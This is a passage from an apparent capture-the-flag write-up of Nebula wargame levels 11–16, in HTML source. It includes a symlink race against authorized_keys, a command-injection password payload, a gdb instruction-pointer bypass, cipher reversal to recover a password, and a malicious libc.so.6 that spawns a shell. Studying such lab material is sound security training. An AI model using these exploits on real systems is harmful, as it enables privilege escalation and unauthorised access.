    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;getrand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;symlink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/home/flag11/.ssh/authorized_keys&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%s%d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using this method, I simply SSHed into flag11’s account by &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh flag11@127.0.0.1&lt;/code&gt;, concluding this level.&lt;/p&gt;

&lt;h2 id=&quot;level12&quot;&gt;Level12&lt;/h2&gt;

&lt;p&gt;This is a simple problem. The lua script did not sanitise the input received, thus allowing arbitrary code execution during the step &lt;code class=&quot;highlighter-rouge&quot;&gt;io.popen(&quot;echo &quot;..password..&quot; | sha1sum&quot;, &quot;r&quot;)&lt;/code&gt;. To connect to the listening process, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;telnet hostname port&lt;/code&gt;, which would be &lt;code class=&quot;highlighter-rouge&quot;&gt;telnet 127.0.0.1 50001&lt;/code&gt; in this case. This allows a connection to the listening process. Then, we can design our input to suit the bash code above; I picked “a;getflag &amp;gt; /tmp/a.txt; echo a”, which redirects the output of &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; to the file “/tmp/a.txt”, allowing us to check the results of the code execution. This successfully obtains the flag, and the full process is described below:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level12@nebula:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;telnet 127.0.0.1 50001
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Password: a&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; getflag &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/a.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;a
Better luck next &lt;span class=&quot;nb&quot;&gt;time
&lt;/span&gt;Connection closed by foreign host.
level12@nebula:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/a.txt
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;level13&quot;&gt;Level13&lt;/h2&gt;

&lt;p&gt;The program is quite simple and rigid and there appears to be no problem with the binary itself. However, as we have control of the program environment as well, it is easy to manipulate the state of the binary. This can be done using a debugger, specifically gdb.&lt;/p&gt;

&lt;p&gt;Using gdb, we are able to bypass the &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement and thus prevent the early exit of the program. I broke the program &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;, and printed the disassembled code. Using that, I determined the location of the &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement, and overwrote “eip” (instruction pointer) with the address the statement jumps to when &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt; is equal to 1000. This process is described below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level13@nebula:~$ gdb /home/flag13/flag13
GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08
Copyright (C) 2011 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
and &quot;show warranty&quot; for details.
This GDB was configured as &quot;i686-linux-gnu&quot;.
For bug reporting instructions, please see:
&amp;lt;http://bugs.launchpad.net/gdb-linaro/&amp;gt;...
Reading symbols from /home/flag13/flag13...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x80484c9
(gdb) r
Starting program: /home/flag13/flag13

Breakpoint 1, 0x080484c9 in main ()
(gdb) x/29 main
   0x80484c4 &amp;lt;main&amp;gt;:    push   %ebp
   0x80484c5 &amp;lt;main+1&amp;gt;:  mov    %esp,%ebp
   0x80484c7 &amp;lt;main+3&amp;gt;:  push   %edi
   0x80484c8 &amp;lt;main+4&amp;gt;:  push   %ebx
=&amp;gt; 0x80484c9 &amp;lt;main+5&amp;gt;:  and    $0xfffffff0,%esp
   0x80484cc &amp;lt;main+8&amp;gt;:  sub    $0x130,%esp
   0x80484d2 &amp;lt;main+14&amp;gt;: mov    0xc(%ebp),%eax
   0x80484d5 &amp;lt;main+17&amp;gt;: mov    %eax,0x1c(%esp)
   0x80484d9 &amp;lt;main+21&amp;gt;: mov    0x10(%ebp),%eax
   0x80484dc &amp;lt;main+24&amp;gt;: mov    %eax,0x18(%esp)
   0x80484e0 &amp;lt;main+28&amp;gt;: mov    %gs:0x14,%eax
   0x80484e6 &amp;lt;main+34&amp;gt;: mov    %eax,0x12c(%esp)
   0x80484ed &amp;lt;main+41&amp;gt;: xor    %eax,%eax
   0x80484ef &amp;lt;main+43&amp;gt;: call   0x80483c0 &amp;lt;getuid@plt&amp;gt;
   0x80484f4 &amp;lt;main+48&amp;gt;: cmp    $0x3e8,%eax
   0x80484f9 &amp;lt;main+53&amp;gt;: je     0x8048531 &amp;lt;main+109&amp;gt;
   0x80484fb &amp;lt;main+55&amp;gt;: call   0x80483c0 &amp;lt;getuid@plt&amp;gt;
   0x8048500 &amp;lt;main+60&amp;gt;: mov    $0x80486d0,%edx
   0x8048505 &amp;lt;main+65&amp;gt;: movl   $0x3e8,0x8(%esp)
   0x804850d &amp;lt;main+73&amp;gt;: mov    %eax,0x4(%esp)
   0x8048511 &amp;lt;main+77&amp;gt;: mov    %edx,(%esp)
   0x8048514 &amp;lt;main+80&amp;gt;: call   0x80483a0 &amp;lt;printf@plt&amp;gt;
   0x8048519 &amp;lt;main+85&amp;gt;: movl   $0x804870c,(%esp)
   0x8048520 &amp;lt;main+92&amp;gt;: call   0x80483d0 &amp;lt;puts@plt&amp;gt;
   0x8048525 &amp;lt;main+97&amp;gt;: movl   $0x1,(%esp)
   0x804852c &amp;lt;main+104&amp;gt;:        call   0x80483f0 &amp;lt;exit@plt&amp;gt;
   0x8048531 &amp;lt;main+109&amp;gt;:        lea    0x2c(%esp),%eax
   0x8048535 &amp;lt;main+113&amp;gt;:        mov    %eax,%ebx
   0x8048537 &amp;lt;main+115&amp;gt;:        mov    $0x0,%eax
(gdb) break *0x80484f9
Breakpoint 2 at 0x80484f9
(gdb) c
Continuing.

Breakpoint 2, 0x080484f9 in main ()
(gdb) set $eip = 0x8048531
(gdb) c
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 1637) exited with code 063]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using the token, I am able to log into “flag13” and execute &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;level14&quot;&gt;Level14&lt;/h2&gt;

&lt;p&gt;This level is rather trivial. The file “token” contains the string “857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.”, which should be the result after applying the encryption from the executable. Playing around with the executable, you may notice the first character is always the same in both encrypted and unencrypted text. Furthermore, the second character always differs by 1. From this, I hypothesised that the executable increments the character by its position in the string. This is verified (to an extent) by the following:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level14@nebula:/home/flag14&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./flag14 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt;
aaaaaaaaaa
abcdefghij
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From this point, we can create a python script that reverses the encryption. Running the following script results in “8457c118-887c-4e40-a5a6-33a25353165”, which is the password for “flag14”. We can then execute &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; successfully.&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;level15&quot;&gt;Level15&lt;/h2&gt;

&lt;p&gt;Following the hint, I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;strace /home/flag15/flag15&lt;/code&gt;, and the following results popped up:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;level15@nebula:~$ strace /home/flag15/flag15
execve(&quot;/home/flag15/flag15&quot;, [&quot;/home/flag15/flag15&quot;], [/* 18 vars */]) = 0
brk(0)                                  = 0x859a000
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7799000
access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/i686/sse2/cmov&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/i686/sse2&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/i686/cmov&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/i686&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/sse2/cmov&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/sse2&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls/cmov&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/tls/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/tls&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/i686/sse2/cmov&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/i686/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/i686/sse2&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/i686/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/i686/cmov&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/i686/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/i686&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/sse2/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/sse2/cmov&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/sse2/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/sse2&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/cmov/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15/cmov&quot;, 0xbfa0c344) = -1 ENOENT (No such file or directory)
open(&quot;/var/tmp/flag15/libc.so.6&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&quot;/var/tmp/flag15&quot;, {st_mode=S_IFDIR|0775, st_size=40, ...}) = 0
open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7790000
close(3)                                = 0
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
open(&quot;/lib/i386-linux-gnu/libc.so.6&quot;, O_RDONLY) = 3
read(3, &quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&quot;..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xbf3000
mmap2(0xd69000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xd69000
mmap2(0xd6c000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xd6c000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb778f000
set_thread_area({entry_number:-1 -&amp;gt; 6, base_addr:0xb778f8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xd69000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x32f000, 4096, PROT_READ)     = 0
munmap(0xb7790000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7798000
write(1, &quot;strace it!\n&quot;, 11strace it!
)            = 11
exit_group(11)                          = ?
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The large group of &lt;code class=&quot;highlighter-rouge&quot;&gt;open&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;stat64&lt;/code&gt; seems to be attempting to open a “libc.so.6” file; however, it cannot find any. Reading the description, it seems we need to create our own “libc.so.6” and place it in one of the directories. This way, we can control the function, and execute arbitary code. A possilbe libc function to replace is &lt;code class=&quot;highlighter-rouge&quot;&gt;__libc_start_main&lt;/code&gt;, which is guarenteed to exist in all executables. This is confirmed by &lt;code class=&quot;highlighter-rouge&quot;&gt;objdump -r /home/flag15/flag15&lt;/code&gt;. Thus, I created the file “/var/tmp/flag15/tmp.c” with the following content:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__libc_start_main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ubp_av&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fini&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rtld_fini&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack_end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, when we compile it using the standard command &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -fPIC -shared -o libc.so.6 tmp.c&lt;/code&gt;, we get the error “/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.0 not defined in file libc.so.6 with link time reference”. The main problem appears to be lack of definition for &lt;code class=&quot;highlighter-rouge&quot;&gt;__cxa_finalize&lt;/code&gt; , which is fixed by adding the following code to “/tmp”:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__cxa_finalize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Recompiling and excecuting, we obtain another relocation error, but for &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; this time. This is because &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; is a libc function, which is currently dynamically linked in. To statically link in the system, we modify the compiler command to &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -fPIC -shared -static-libgcc -Wl,-Bstatic -o libc.so.6 tmp.c&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;-Wl&lt;/code&gt; specifies arguments for the linker.&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;This time, the error “Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion ‘version-&amp;gt;filename == ((void *)0)&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;! _dl_name_match_p (version-&amp;gt;filename, map)’ failed!” comes up. This is due to the lack of version specification of our library. To fix this, I created another file named “version”, and added it to the linker arguments, so the compile command becomes &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 tmp.c&lt;/code&gt;. The file contains “GLIBC_2.0{};”. For more about version, check out &lt;a href=&quot;http://sourceware.org/binutils/docs-2.18/ld/VERSION.html#VERSION&quot;&gt;here&lt;/a&gt;.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Now, compiling and executing the executable spawns a shell. Its priveledges are checked by &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt;. After realising the user is indeed “flag15”, we can execute &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; successfully.&lt;/p&gt;

&lt;p&gt;Don’t forget to clean up by &lt;code class=&quot;highlighter-rouge&quot;&gt;rm /var/tmp/flag15/*&lt;/code&gt; to revert the machine to the previous state.&lt;/p&gt;

&lt;h2 id=&quot;level16&quot;&gt;Level16&lt;/h2&gt;

&lt;p&gt;This is a rather simple level. Looking at the source code it can be easily spotted that there is an exploit in the line &lt;code class=&quot;highlighter-rouge&quot;&gt;egrep &quot;^$username&quot; /home/flag16/userdb.txt 2&amp;gt;&amp;amp;1&lt;/code&gt;, as we basically have control over &lt;code class=&quot;highlighter-rouge&quot;&gt;$username&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;$username&lt;/code&gt; is first preprocessed by converting all characters to uppercase and stripping all characters after a 0. However, both are only minor conviniences. I planned to set &lt;code class=&quot;highlighter-rouge&quot;&gt;$username&lt;/code&gt; to a custom bash file that executes &lt;code class=&quot;highlighter-rouge&quot;&gt;getflag&lt;/code&gt; and stores the output in a file. I was able to utilise the bash wildcard, the astrick, to specify the pathing, as long as the name of the bash file is correct. At the end, I ended up with the following code, stored in a file named “AAA” in the “/tmp” directory:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;getflag &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/output
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

